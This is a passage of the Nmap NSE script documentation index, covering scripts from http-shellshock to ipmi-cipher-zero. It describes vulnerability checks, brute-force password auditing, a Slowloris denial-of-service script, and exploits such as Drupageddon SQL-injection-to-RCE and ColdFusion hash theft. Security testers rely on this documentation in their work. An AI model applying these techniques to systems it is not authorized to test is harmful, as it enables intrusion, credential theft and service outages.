https://nmap.org/nsedoc/scripts/http-shellshock.html
  Attempts to exploit the "shellshock" vulnerability (CVE-2014-6271 and
  CVE-2014-7169) in web applications.

  To detect this vulnerability the script executes a command that prints a random
  string and then attempts to find it inside the response body. Web apps that
  don't print back information won't be detected with this method.

  By default the script injects the payload in the HTTP headers User-Agent,
  Cookie, and Referer.

  Vulnerability originally discovered by Stephane Chazelas.

  References:
  * http://www.openwall.com/lists/oss-security/2014/09/24/10
  * http://seclists.org/oss-sec/2014/q3/685
  * https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
  * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

http-sitemap-generator
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-sitemap-generator.html
  Spiders a web server and displays its directory structure along with
  number and types of files in each folder. Note that files listed as
  having an 'Other' extension are ones that have no extension or that
  are a root document.

http-slowloris-check
Categories: vuln safe
https://nmap.org/nsedoc/scripts/http-slowloris-check.html
  Tests a web server for vulnerability to the Slowloris DoS attack without
  actually launching a DoS attack.

  Slowloris was described at Defcon 17 by RSnake
  (see http://ha.ckers.org/slowloris/).

  This script opens two connections to the server, each without the final CRLF.
  After 10 seconds, second connection sends additional header. Both connections
  then wait for server timeout.  If second connection gets a timeout 10 or more
  seconds after the first one, we can conclude that sending additional header
  prolonged its timeout and that the server is vulnerable to slowloris DoS
  attack.

  A "LIKELY VULNERABLE" result means a server is subject to timeout-extension
  attack, but depending on the http server's architecture and resource limits, a
  full denial-of-service is not always possible. Complete testing requires
  triggering the actual DoS condition and measuring server responsiveness.

  You can specify custom http User-agent field with <code>http.useragent</code>
  script argument.

  Idea from Qualys blogpost:
  * https://community.qualys.com/blogs/securitylabs/2011/07/07/identifying-slow-http-attack-vulnerabilities-on-web-applications


http-slowloris
Categories: dos intrusive
https://nmap.org/nsedoc/scripts/http-slowloris.html
  Tests a web server for vulnerability to the Slowloris DoS attack by launching a Slowloris attack.

  Slowloris was described at Defcon 17 by RSnake
  (see http://ha.ckers.org/slowloris/).

  This script opens and maintains numerous 'half-HTTP' connections until
  the server runs out of resources, leading to a denial of service. When
  a successful DoS is detected, the script stops the attack and returns
  these pieces of information (which may be useful to tweak further
  filtering rules):
  * Time taken until DoS
  * Number of sockets used
  * Number of queries sent
  By default the script runs for 30 minutes if DoS is not achieved.

  Please note that the number of concurrent connexions must be defined
  with the <code>--max-parallelism</code> option (default is 20, suggested
  is 400 or more) Also, be advised that in some cases this attack can
  bring the web server down for good, not only while the attack is
  running.

  Also, due to OS limitations, the script is unlikely to work
  when run from Windows.

http-sql-injection
Categories: intrusive vuln
https://nmap.org/nsedoc/scripts/http-sql-injection.html
  Spiders an HTTP server looking for URLs containing queries vulnerable to an SQL
  injection attack. It also extracts forms from found websites and tries to identify
  fields that are vulnerable.

  The script spiders an HTTP server looking for URLs containing queries. It then
  proceeds to combine crafted SQL commands with susceptible URLs in order to
  obtain errors. The errors are analysed to see if the URL is vulnerable to
  attack. This uses the most basic form of SQL injection but anything more
  complicated is better suited to a standalone tool.

  We may not have access to the target web server's true hostname, which can prevent access to
  virtually hosted sites.

http-stored-xss
Categories: intrusive exploit vuln
https://nmap.org/nsedoc/scripts/http-stored-xss.html
  Posts specially crafted strings to every form it
  encounters and then searches through the website for those
  strings to determine whether the payloads were successful.

http-svn-enum
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/http-svn-enum.html
  Enumerates users of a Subversion repository by examining logs of most recent commits.

http-svn-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/http-svn-info.html
  Requests information from a Subversion repository.

http-title
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/http-title.html
  Shows the title of the default page of a web server.

  The script will follow up to 5 HTTP redirects, using the default rules in the
  http library.

http-tplink-dir-traversal
Categories: vuln exploit
https://nmap.org/nsedoc/scripts/http-tplink-dir-traversal.html
  Exploits a directory traversal vulnerability existing in several TP-Link
  wireless routers. Attackers may exploit this vulnerability to read any of the
  configuration and password files remotely and without authentication.

  This vulnerability was confirmed in models WR740N, WR740ND and WR2543ND but
  there are several models that use the same HTTP server so I believe they could
  be vulnerable as well. I appreciate any help confirming the vulnerability in
  other models.

  Advisory:
  * http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740

  Other interesting files:
  * /tmp/topology.cnf (Wireless configuration)
  * /tmp/ath0.ap_bss (Wireless encryption key)

http-trace
Categories: vuln discovery safe
https://nmap.org/nsedoc/scripts/http-trace.html
  Sends an HTTP TRACE request and shows if the method TRACE is enabled. If debug
  is enabled, it returns the header fields that were modified in the response.

http-traceroute
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-traceroute.html
  Exploits the Max-Forwards HTTP header to detect the presence of reverse proxies.

  The script works by sending HTTP requests with values of the Max-Forwards HTTP
  header varying from 0 to 2 and checking for any anomalies in certain response
  values such as the status code, Server, Content-Type and Content-Length HTTP
  headers and body values such as the HTML title.

  Based on the work of:
  * Nicolas Gregoire (nicolas.gregoire@agarri.fr)
  * Julien Cayssol (tools@aqwz.com)

  For more information, see:
  * http://www.agarri.fr/kom/archives/2011/11/12/traceroute-like_http_scanner/index.html

http-trane-info
Categories: discovery version safe
https://nmap.org/nsedoc/scripts/http-trane-info.html
  Attempts to obtain information from Trane Tracer SC devices. Trane Tracer SC
   is an intelligent field panel for communicating with HVAC equipment controllers
   deployed across several sectors including commercial facilities and others.

  The information is obtained from the web server that exposes sensitive content to
   unauthenticated users.

  Tested on Trane Tracer SC version 4.40.1211 and below.

  References:
  * http://websec.mx/publicacion/blog/Scripts-de-Nmap-para-Trane-Tracer-SC-HVAC

http-unsafe-output-escaping
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-unsafe-output-escaping.html
  Spiders a website and attempts to identify output escaping problems
  where content is reflected back to the user.  This script locates all
  parameters, ?x=foo&y=bar and checks if the values are reflected on the
  page. If they are indeed reflected, the script will try to insert
  ghz>hzx"zxc'xcv and check which (if any) characters were reflected
  back onto the page without proper html escaping.  This is an
  indication of potential XSS vulnerability.

http-useragent-tester
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-useragent-tester.html
  Checks if various crawling utilities are allowed by the host.

http-userdir-enum
Categories: auth intrusive
https://nmap.org/nsedoc/scripts/http-userdir-enum.html
  Attempts to enumerate valid usernames on web servers running with the mod_userdir
  module or similar enabled.

  The Apache mod_userdir module allows user-specific directories to be accessed
  using the http://example.com/~user/ syntax.  This script makes http requests in
  order to discover valid user-specific directories and infer valid usernames.  By
  default, the script will use Nmap's
  <code>nselib/data/usernames.lst</code>.  An HTTP response
  status of 200 or 403 means the username is likely a valid one and the username
  will be output in the script results along with the status code (in parentheses).

  This script makes an attempt to avoid false positives by requesting a directory
  which is unlikely to exist.  If the server responds with 200 or 403 then the
  script will not continue testing it.

  CVE-2001-1013: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2001-1013.

http-vhosts
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-vhosts.html
  Searches for web virtual hostnames by making a large number of HEAD requests against http servers using common hostnames.

  Each HEAD request provides a different
  <code>Host</code> header. The hostnames come from a built-in default
  list. Shows the names that return a document. Also shows the location of
  redirections.

  The domain can be given as the <code>http-vhosts.domain</code> argument or
  deduced from the target's name. For example when scanning www.example.com,
  various names of the form <name>.example.com are tried.

http-virustotal
Categories: safe malware external
https://nmap.org/nsedoc/scripts/http-virustotal.html
  Checks whether a file has been determined as malware by Virustotal. Virustotal
  is a service that provides the capability to scan a file or check a checksum
  against a number of the major antivirus vendors. The script uses the public
  API which requires a valid API key and has a limit on 4 queries per minute.
  A key can be acquired by registering as a user on the virustotal web page:
  * http://www.virustotal.com

  The scripts supports both sending a file to the server for analysis or
  checking whether a checksum (supplied as an argument or calculated from a
  local file) was previously discovered as malware.

  As uploaded files are queued for analysis, this mode simply returns a URL
  where status of the queued file may be checked.

http-vlcstreamer-ls
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-vlcstreamer-ls.html
  Connects to a VLC Streamer helper service and lists directory contents. The
  VLC Streamer helper service is used by the iOS VLC Streamer application to
  enable streaming of multimedia content from the remote server to the device.

http-vmware-path-vuln
Categories: vuln safe
https://nmap.org/nsedoc/scripts/http-vmware-path-vuln.html
  Checks for a path-traversal vulnerability in VMWare ESX, ESXi, and Server (CVE-2009-3733).

  The vulnerability was originally released by Justin Morehouse and Tony Flick, who presented at Shmoocon 2010 (http://fyrmassociates.com/tools.html).

http-vuln-cve2006-3392
Categories: exploit vuln intrusive
https://nmap.org/nsedoc/scripts/http-vuln-cve2006-3392.html
  Exploits a file disclosure vulnerability in Webmin (CVE-2006-3392)

  Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
  This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
  to bypass the removal of "../" directory traversal sequences.

http-vuln-cve2009-3960
Categories: exploit intrusive vuln
https://nmap.org/nsedoc/scripts/http-vuln-cve2009-3960.html
  Exploits cve-2009-3960 also known as Adobe XML External Entity Injection.

  This vulnerability permits to read local files remotely and is present in
  BlazeDS 3.2 and earlier, LiveCycle 8.0.1, 8.2.1, and 9.0,  LiveCycle Data
  Services 2.5.1, 2.6.1, and 3.0, Flex Data Services 2.0.1, and
  ColdFusion 7.0.2, 8.0, 8.0.1, and 9.0

  For more information see:
  * http://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf
  * https://www.securityfocus.com/bid/38197
  * Metasploit module: auxiliary/scanner/http/adobe_xml_inject

http-vuln-cve2010-0738
Categories: safe auth vuln
https://nmap.org/nsedoc/scripts/http-vuln-cve2010-0738.html
  Tests whether a JBoss target is vulnerable to jmx console authentication bypass (CVE-2010-0738).

  It works by checking if the target paths require authentication or redirect to a login page that could be
  bypassed via a HEAD request. RFC 2616 specifies that the HEAD request should be treated exactly like GET but
  with no returned response body. The script also detects if the URL does not require authentication at all.

  For more information, see:
  * CVE-2010-0738 http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0738
  * http://www.imperva.com/resources/glossary/http_verb_tampering.html
  * https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29


http-vuln-cve2010-2861
Categories: intrusive vuln
https://nmap.org/nsedoc/scripts/http-vuln-cve2010-2861.html
  Executes a directory traversal attack against a ColdFusion
  server and tries to grab the password hash for the administrator user. It
  then uses the salt value (hidden in the web page) to create the SHA1
  HMAC hash that the web server needs for authentication as admin. You can
  pass this value to the ColdFusion server as the admin without cracking
  the password hash.

http-vuln-cve2011-3192
Categories: vuln safe
https://nmap.org/nsedoc/scripts/http-vuln-cve2011-3192.html
  Detects a denial of service vulnerability in the way the Apache web server
  handles requests for multiple overlapping/simple ranges of a page.

  References:
  * https://seclists.org/fulldisclosure/2011/Aug/175
  * https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
  * https://www.tenable.com/plugins/nessus/55976

http-vuln-cve2011-3368
Categories: intrusive vuln
https://nmap.org/nsedoc/scripts/http-vuln-cve2011-3368.html
  Tests for the CVE-2011-3368 (Reverse Proxy Bypass) vulnerability in Apache HTTP server's reverse proxy mode.
  The script will run 3 tests:
  * the loopback test, with 3 payloads to handle different rewrite rules
  * the internal hosts test. According to Contextis, we expect a delay before a server error.
  * The external website test. This does not mean that you can reach a LAN ip, but this is a relevant issue anyway.

  References:
  * http://www.contextis.com/research/blog/reverseproxybypass/

http-vuln-cve2012-1823
Categories: exploit vuln intrusive
https://nmap.org/nsedoc/scripts/http-vuln-cve2012-1823.html
  Detects PHP-CGI installations that are vulnerable to CVE-2012-1823, This
  critical vulnerability allows attackers to retrieve source code and execute
  code remotely.

  The script works by appending "?-s" to the uri to make vulnerable php-cgi
  handlers return colour syntax highlighted source. We use the pattern "<span
  style=.*>&lt;?" to detect
  vulnerable installations.

http-vuln-cve2013-0156
Categories: exploit vuln
https://nmap.org/nsedoc/scripts/http-vuln-cve2013-0156.html
  Detects Ruby on Rails servers vulnerable to object injection, remote command
  executions and denial of service attacks. (CVE-2013-0156)

  All Ruby on Rails versions before 2.3.15, 3.0.x before 3.0.19, 3.1.x before
  3.1.10, and 3.2.x before 3.2.11 are vulnerable. This script sends 3 harmless
  YAML payloads to detect vulnerable installations. If the malformed object
  receives a status 500 response, the server is processing YAML objects and
  therefore is likely vulnerable.

  References:
  * https://community.rapid7.com/community/metasploit/blog/2013/01/10/exploiting-ruby-on-rails-with-metasploit-cve-2013-0156',
  * https://groups.google.com/forum/?fromgroups=#!msg/rubyonrails-security/61bkgvnSGTQ/nehwjA8tQ8EJ',
  * http://cvedetails.com/cve/2013-0156/

http-vuln-cve2013-6786
Categories: exploit vuln
https://nmap.org/nsedoc/scripts/http-vuln-cve2013-6786.html
  Detects a URL redirection and reflected XSS vulnerability in Allegro RomPager
  Web server. The vulnerability has been assigned CVE-2013-6786.

  The check is general enough (script tag injection via Referer header) that some
  other software may be vulnerable in the same way.

http-vuln-cve2013-7091
Categories: exploit vuln intrusive
https://nmap.org/nsedoc/scripts/http-vuln-cve2013-7091.html
  An 0 day was released on the 6th December 2013 by rubina119, and was patched in Zimbra 7.2.6.

  The vulnerability is a local file inclusion that can retrieve any file from the server.

  Currently, we read /etc/passwd and /dev/null, and compare the lengths to determine vulnerability.

  TODO:
  Add the possibility to read compressed file.
  Then, send some payload to create the new mail account.

http-vuln-cve2014-2126
Categories: vuln safe
https://nmap.org/nsedoc/scripts/http-vuln-cve2014-2126.html
  Detects whether the Cisco ASA appliance is vulnerable to the Cisco ASA ASDM
  Privilege Escalation Vulnerability (CVE-2014-2126).

http-vuln-cve2014-2127
Categories: vuln safe
https://nmap.org/nsedoc/scripts/http-vuln-cve2014-2127.html
  Detects whether the Cisco ASA appliance is vulnerable to the Cisco ASA SSL VPN
  Privilege Escalation Vulnerability (CVE-2014-2127).

http-vuln-cve2014-2128
Categories: vuln safe
https://nmap.org/nsedoc/scripts/http-vuln-cve2014-2128.html
  Detects whether the Cisco ASA appliance is vulnerable to the Cisco ASA SSL VPN
  Authentication Bypass Vulnerability (CVE-2014-2128).

http-vuln-cve2014-2129
Categories: vuln safe
https://nmap.org/nsedoc/scripts/http-vuln-cve2014-2129.html
  Detects whether the Cisco ASA appliance is vulnerable to the Cisco ASA SIP
  Denial of Service Vulnerability (CVE-2014-2129).

http-vuln-cve2014-3704
Categories: vuln intrusive exploit
https://nmap.org/nsedoc/scripts/http-vuln-cve2014-3704.html
  Exploits CVE-2014-3704 also known as 'Drupageddon' in Drupal. Versions < 7.32
  of Drupal core are known to be affected.

  Vulnerability allows remote attackers to conduct SQL injection attacks via an
  array containing crafted keys.

  The script injects new Drupal administrator user via login form and then it
  attempts to log in as this user to determine if target is vulnerable. If that's
  the case following exploitation steps are performed:

  * PHP filter module which allows embedded PHP code/snippets to be evaluated is enabled,
  * permission to use PHP code for administrator users is set,
  * new article which contains payload is created & previewed,
  * cleanup: by default all DB records that were added/modified by the script are restored.

  Vulnerability originally discovered by Stefan Horst from SektionEins.

  Exploitation technique used to achieve RCE on the target is based on exploit/multi/http/drupal_drupageddon Metasploit module.

http-vuln-cve2014-8877
Categories: vuln intrusive exploit
https://nmap.org/nsedoc/scripts/http-vuln-cve2014-8877.html
  Exploits a remote code injection vulnerability (CVE-2014-8877) in Wordpress CM
  Download Manager plugin. Versions <= 2.0.0 are known to be affected.

  CM Download Manager plugin does not correctly sanitise the user input which
  allows remote attackers to execute arbitrary PHP code via the CMDsearch
  parameter to cmdownloads/, which is processed by the PHP 'create_function'
  function.

  The script injects PHP system() function into the vulnerable target in order to
  execute specified shell command.

http-vuln-cve2015-1427
Categories: vuln intrusive
https://nmap.org/nsedoc/scripts/http-vuln-cve2015-1427.html
  This script attempts to detect a vulnerability, CVE-2015-1427, which  allows attackers
   to leverage features of this API to gain unauthenticated remote code execution (RCE).

   Elasticsearch versions 1.3.0-1.3.7 and 1.4.0-1.4.2 have a vulnerability in the Groovy scripting engine.
   The vulnerability allows an attacker to construct Groovy scripts that escape the sandbox and execute shell
   commands as the user running the Elasticsearch Java VM.

http-vuln-cve2015-1635
Categories: vuln safe
https://nmap.org/nsedoc/scripts/http-vuln-cve2015-1635.html
  Checks for a remote code execution vulnerability (MS15-034) in Microsoft Windows systems (CVE2015-2015-1635).

  The script sends a specially crafted HTTP request with no impact on the system to detect this vulnerability.
  The affected versions are Windows 7, Windows Server 2008 R2, Windows 8, Windows Server 2012, Windows 8.1,
  and Windows Server 2012 R2.

  References:
  * https://technet.microsoft.com/library/security/MS15-034

http-vuln-cve2017-1001000
Categories: vuln safe
https://nmap.org/nsedoc/scripts/http-vuln-cve2017-1001000.html
  Attempts to detect a privilege escalation vulnerability in Wordpress 4.7.0 and 4.7.1 that
  allows unauthenticated users to inject content in posts.

  The script connects to the Wordpress REST API to obtain the list of published posts and
  grabs the user id and date from there. Then it attempts to update the date field in the
  post with the same date information we just obtained. If the request doesnΓÇÖt return an
  error, we mark the server as vulnerable.

  References:
  https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html


http-vuln-cve2017-5638
Categories: vuln
https://nmap.org/nsedoc/scripts/http-vuln-cve2017-5638.html
  Detects whether the specified URL is vulnerable to the Apache Struts
  Remote Code Execution Vulnerability (CVE-2017-5638).

http-vuln-cve2017-5689
Categories: vuln auth exploit
https://nmap.org/nsedoc/scripts/http-vuln-cve2017-5689.html
  Detects if a system with Intel Active Management Technology is vulnerable to the INTEL-SA-00075
  privilege escalation vulnerability (CVE2017-5689).

  This script determines if a target is vulnerable by attempting to perform digest authentication
  with a blank response parameter. If the authentication succeeds, a HTTP 200 response is received.

  References:
  * https://www.tenable.com/blog/rediscovering-the-intel-amt-vulnerability

http-vuln-cve2017-8917
Categories: vuln intrusive
https://nmap.org/nsedoc/scripts/http-vuln-cve2017-8917.html
  An SQL Injection vulnerability affecting Joomla! 3.7.x before 3.7.1 allows for
  unauthenticated users to execute arbitrary SQL commands. This vulnerability was
  caused by a new component, <code>com_fields</code>, which was introduced in
  version 3.7. This component is publicly accessible, which means this can be
  exploited by any malicious individual visiting the site.

  The script attempts to inject an SQL statement that runs the <code>user()</code>
  information function on the target website. A successful injection will return
  the current MySQL user name and host name in the extra_info table.

  This script is based on a Python script written by brianwrf.

  References:
  * https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
  * https://github.com/brianwrf/Joomla3.7-SQLi-CVE-2017-8917

http-vuln-misfortune-cookie
Categories: vuln intrusive
https://nmap.org/nsedoc/scripts/http-vuln-misfortune-cookie.html
  Detects the RomPager 4.07 Misfortune Cookie vulnerability by safely exploiting it.
http-vuln-wnr1000-creds
Categories: exploit vuln intrusive
https://nmap.org/nsedoc/scripts/http-vuln-wnr1000-creds.html
  A vulnerability has been discovered in WNR 1000 series that allows an attacker
  to retrieve administrator credentials with the router interface.
  Tested On Firmware Version(s): V1.0.2.60_60.0.86 (Latest) and V1.0.2.54_60.0.82NA

  Vulnerability discovered by c1ph04.

http-waf-detect
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-waf-detect.html
  Attempts to determine whether a web server is protected by an IPS (Intrusion
  Prevention System), IDS (Intrusion Detection System) or WAF (Web Application
  Firewall) by probing the web server with malicious payloads and detecting
  changes in the response code and body.

  To do this the script will send a "good" request and record the response,
  afterwards it will match this response against new requests containing
  malicious payloads. In theory, web applications shouldn't react to malicious
  requests because we are storing the payloads in a variable that is not used by
  the script/file and only WAF/IDS/IPS should react to it.  If aggro mode is set,
  the script will try all attack vectors (More noisy)

  This script can detect numerous IDS, IPS, and WAF products since they often
  protect web applications in the same way.  But it won't detect products which
  don't alter the http traffic.  Results can vary based on product configuration,
  but this script has been tested to work against various configurations of the
  following products:

  * Apache ModSecurity
  * Barracuda Web Application Firewall
  * PHPIDS
  * dotDefender
  * Imperva Web Firewall
  * Blue Coat SG 400


http-waf-fingerprint
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-waf-fingerprint.html
  Tries to detect the presence of a web application firewall and its type and
  version.

  This works by sending a number of requests and looking in the responses for
  known behavior and fingerprints such as Server header, cookies and headers
  values. Intensive mode works by sending additional WAF specific requests to
  detect certain behaviour.

  Credit to wafw00f and w3af for some fingerprints.

http-webdav-scan
Categories: safe discovery default
https://nmap.org/nsedoc/scripts/http-webdav-scan.html
  A script to detect WebDAV installations. Uses the OPTIONS and PROPFIND methods.

  The script sends an OPTIONS request which lists the dav type, server type, date
  and allowed methods. It then sends a PROPFIND request and tries to fetch exposed
  directories and internal ip addresses by doing pattern matching in the response body.

  This script takes inspiration from the various scripts listed here:
  * http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html
  * https://github.com/sussurro/Metasploit-Tools/blob/master/modules/auxiliary/scanner/http/webdav_test.rb
  * http://code.google.com/p/davtest/

http-wordpress-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/http-wordpress-brute.html
  performs brute force password auditing against Wordpress CMS/blog installations.

  This script uses the unpwdb and brute libraries to perform password guessing. Any successful guesses are
  stored using the credentials library.

  Wordpress default uri and form names:
  * Default uri:<code>wp-login.php</code>
  * Default uservar: <code>log</code>
  * Default passvar: <code>pwd</code>

http-wordpress-enum
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-wordpress-enum.html
  Enumerates themes and plugins of Wordpress installations. The script can also detect
   outdated plugins by comparing version numbers with information pulled from api.wordpress.org.

  The script works with two separate databases for themes (wp-themes.lst) and plugins (wp-plugins.lst).
  The databases are sorted by popularity and the script will search only the top 100 entries by default.
  The theme database has around 32,000 entries while the plugin database has around 14,000 entries.

  The script determines the version number of a plugin by looking at the readme.txt file inside the plugin
  directory and it uses the file style.css inside a theme directory to determine the theme version.
  If the script argument check-latest is set to true, the script will query api.wordpress.org to obtain
  the latest version number available. This check is disabled by default since it queries an external service.

  This script is a combination of http-wordpress-plugins.nse and http-wordpress-themes.nse originally
  submited by Ange Gutek and Peter Hill.

  TODO:
  -Implement version checking for themes.

http-wordpress-users
Categories: auth intrusive vuln
https://nmap.org/nsedoc/scripts/http-wordpress-users.html
  Enumerates usernames in Wordpress blog/CMS installations by exploiting an
  information disclosure vulnerability existing in versions 2.6, 3.1, 3.1.1,
  3.1.3 and 3.2-beta2 and possibly others.

  Original advisory:
  * http://www.talsoft.com.ar/site/research/security-advisories/wordpress-user-id-and-user-name-disclosure/

http-xssed
Categories: safe external discovery
https://nmap.org/nsedoc/scripts/http-xssed.html
  This script searches the xssed.com database and outputs the result.

https-redirect
Categories: version
https://nmap.org/nsedoc/scripts/https-redirect.html
  Check for HTTP services that redirect to the HTTPS on the same port.

iax2-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/iax2-brute.html
  Performs brute force password auditing against the Asterisk IAX2 protocol.
  Guessing fails when a large number of attempts is made due to the maxcallnumber limit (default 2048).
  In case your getting "ERROR: Too many retries, aborted ..." after a while, this is most likely what's happening.
  In order to avoid this problem try:
    - reducing the size of your dictionary
    - use the brute delay option to introduce a delay between guesses
    - split the guessing up in chunks and wait for a while between them

iax2-version
Categories: version
https://nmap.org/nsedoc/scripts/iax2-version.html
  Detects the UDP IAX2 service.

  The script sends an Inter-Asterisk eXchange (IAX) Revision 2 Control Frame POKE
  request and checks for a proper response.  This protocol is used to enable VoIP
  connections between servers as well as client-server communication.

icap-info
Categories: safe discovery
https://nmap.org/nsedoc/scripts/icap-info.html
  Tests a list of known ICAP service names and prints information about
  any it detects. The Internet Content Adaptation Protocol (ICAP) is
  used to extend transparent proxy servers and is generally used for
  content filtering and antivirus scanning.

iec-identify
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/iec-identify.html
  Attempts to identify IEC 60870-5-104 ICS protocol.

  After probing with a TESTFR (test frame) message, a STARTDT (start data
  transfer) message is sent and general interrogation is used to gather the list
  of information object addresses stored.

ike-version
Categories: default discovery safe version
https://nmap.org/nsedoc/scripts/ike-version.html
  Obtains information (such as vendor and device type where available) from an
  IKE service by sending four packets to the host.  This scripts tests with both
  Main and Aggressive Mode and sends multiple transforms per request.

imap-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/imap-brute.html
  Performs brute force password auditing against IMAP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.

imap-capabilities
Categories: default safe
https://nmap.org/nsedoc/scripts/imap-capabilities.html
  Retrieves IMAP email server capabilities.

  IMAP4rev1 capabilities are defined in RFC 3501. The CAPABILITY command
  allows a client to ask a server what commands it supports and possibly
  any site-specific policy.

imap-ntlm-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/imap-ntlm-info.html
  This script enumerates information from remote IMAP services with NTLM
  authentication enabled.

  Sending an IMAP NTLM authentication request with null credentials will
  cause the remote service to respond with a NTLMSSP message disclosing
  information to include NetBIOS, DNS, and OS build version.

impress-remote-discover
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/impress-remote-discover.html
  Tests for the presence of the LibreOffice Impress Remote server.
  Checks if a PIN is valid if provided and will bruteforce the PIN
  if requested.

  When a remote first contacts Impress and sends a client name and PIN, the user
  must open the "Slide Show -> Impress Remote" menu and enter the matching PIN at
  the prompt, which shows the client name. Subsequent connections with the same
  client name may then use the same PIN without user interaction.  If no PIN has
  been set for the session, each PIN attempt will result in a new prompt in the
  "Impress Remote" menu. Brute-forcing the PIN, therefore, requires that the user
  has entered a PIN for the same client name, and will result in lots of extra
  prompts in the "Impress Remote" menu.

informix-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/informix-brute.html
  Performs brute force password auditing against IBM Informix Dynamic Server.

informix-query
Categories: intrusive auth
https://nmap.org/nsedoc/scripts/informix-query.html
  Runs a query against IBM Informix Dynamic Server using the given
  authentication credentials (see also: informix-brute).

informix-tables
Categories: intrusive auth
https://nmap.org/nsedoc/scripts/informix-tables.html
  Retrieves a list of tables and column definitions for each database on an Informix server.

ip-forwarding
Categories: safe discovery
https://nmap.org/nsedoc/scripts/ip-forwarding.html
  Detects whether the remote device has ip forwarding or "Internet connection
  sharing" enabled, by sending an ICMP echo request to a given target using
  the scanned host as default gateway.

  The given target can be a routed or a LAN host and needs to be able to respond
  to ICMP requests (ping) in order for the test to be successful. In addition,
  if the given target is a routed host, the scanned host needs to have the proper
  routing to reach it.

  In order to use the scanned host as default gateway Nmap needs to discover
  the MAC address. This requires Nmap to be run in privileged mode and the host
  to be on the LAN.

ip-geolocation-geoplugin
Categories: discovery external safe
https://nmap.org/nsedoc/scripts/ip-geolocation-geoplugin.html
  Tries to identify the physical location of an IP address using the
  Geoplugin geolocation web service (http://www.geoplugin.com/). There
  is no limit on lookups using this service.

ip-geolocation-ipinfodb
Categories: discovery external safe
https://nmap.org/nsedoc/scripts/ip-geolocation-ipinfodb.html
  Tries to identify the physical location of an IP address using the
  IPInfoDB geolocation web service
  (http://ipinfodb.com/ip_location_api.php).

  There is no limit on requests to this service. However, the API key
  needs to be obtained through free registration for this service:
  <code>http://ipinfodb.com/login.php</code>

ip-geolocation-map-bing
Categories: external safe
https://nmap.org/nsedoc/scripts/ip-geolocation-map-bing.html
  This script queries the Nmap registry for the GPS coordinates of targets stored
  by previous geolocation scripts and renders a Bing Map of markers representing
  the targets.

  The Bing Maps REST API has a limit of 100 markers, so if more coordinates are
  found, only the top 100 markers by number of IPs will be shown.

  Additional information for the Bing Maps REST Services API can be found at:
  - https://msdn.microsoft.com/en-us/library/ff701724.aspx

ip-geolocation-map-google
Categories: external safe
https://nmap.org/nsedoc/scripts/ip-geolocation-map-google.html
  This script queries the Nmap registry for the GPS coordinates of targets stored
  by previous geolocation scripts and renders a Google Map of markers representing
  the targets.

  Additional information for the Google Static Maps API can be found at:
  - https://developers.google.com/maps/documentation/static-maps/intro

ip-geolocation-map-kml
Categories: safe
https://nmap.org/nsedoc/scripts/ip-geolocation-map-kml.html
  This script queries the Nmap registry for the GPS coordinates of targets stored
  by previous geolocation scripts and produces a KML file of points representing
  the targets.

ip-geolocation-maxmind
Categories: discovery external safe
https://nmap.org/nsedoc/scripts/ip-geolocation-maxmind.html
  Tries to identify the physical location of an IP address using a
  Geolocation Maxmind database file (available from
  http://www.maxmind.com/app/ip-location). This script supports queries
  using all Maxmind databases that are supported by their API including
  the commercial ones.

ip-https-discover
Categories: discovery safe default
https://nmap.org/nsedoc/scripts/ip-https-discover.html
  Checks if the IP over HTTPS (IP-HTTPS) Tunneling Protocol [1] is supported.

  IP-HTTPS sends Teredo related IPv6 packets over an IPv4-based HTTPS session. This
  indicates that Microsoft DirectAccess [2], which allows remote clients to access
  intranet resources on a domain basis, is supported. Windows clients need
  Windows 7 Enterprise/Ultime or Windows 8.1 Enterprise/Ultimate. Servers need
  Windows Server 2008 (R2) or Windows Server 2012 (R2). Older versions
  of Windows and Windows Server are not supported.

  [1] http://msdn.microsoft.com/en-us/library/dd358571.aspx
  [2] http://technet.microsoft.com/en-us/network/dd420463.aspx

ipidseq
Categories: safe discovery
https://nmap.org/nsedoc/scripts/ipidseq.html
  Classifies a host's IP ID sequence (test for susceptibility to idle
  scan).

  Sends six probes to obtain IP IDs from the target and classifies them
  similarly to Nmap's method.  This is useful for finding suitable zombies
  for Nmap's idle scan (<code>-sI</code>) as Nmap itself doesn't provide a way to scan
  for these hosts.

ipmi-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/ipmi-brute.html
  Performs brute force password auditing against IPMI RPC server.

ipmi-cipher-zero
Categories: vuln safe
https://nmap.org/nsedoc/scripts/ipmi-cipher-zero.html
    IPMI 2.0 Cipher Zero Authentication Bypass Scanner. This module identifies IPMI 2.0
    compatible systems that are vulnerable to an authentication bypass vulnerability
